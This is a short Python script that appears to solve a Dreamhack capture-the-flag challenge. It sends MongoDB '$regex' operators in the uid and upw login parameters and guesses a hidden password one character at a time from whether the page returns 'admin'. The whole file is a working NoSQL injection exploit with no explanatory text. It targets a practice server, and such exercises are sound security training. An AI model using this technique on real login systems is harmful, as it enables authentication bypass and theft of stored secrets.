import requests
import string
url = "http://host1.dreamhack.games:13770/login"
flag = ""
for i in range(32):
    for c in string.printable:
        payload="?uid[$regex]=^adm&upw[$regex]=D.*{" + flag + c
        new_url = url + payload
        r = requests.get(new_url)
        if "admin" in r.text:
            flag += c
            break

print("DH{" + flag + "}")
